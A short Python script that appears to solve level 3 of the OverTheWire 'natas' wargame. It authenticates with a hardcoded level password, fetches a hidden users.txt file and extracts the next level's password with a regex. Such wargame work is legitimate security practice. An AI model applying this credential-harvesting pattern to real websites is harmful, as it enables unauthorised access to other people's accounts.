#!/usr/bin/env python

import requests
import re

username = 'natas3'
password = '3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH'

url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt' % username

try:
    response = requests.get(url, auth=(username, password))
    content = response.text

    # Uncomment the line below to print the entire content of the file
    # print(content)

    # Using regular expression to find the password for natas4
    matches = re.findall(r'natas4:(.*)', content)

    if matches:
        password_natas4 = matches[0].strip()  # Strip any leading or trailing whitespace
        print("Password for natas4:", password_natas4)
    else:
        print("Password for natas4 not found in the file.")
except requests.exceptions.RequestException as e:
    print("An error occurred:", e)
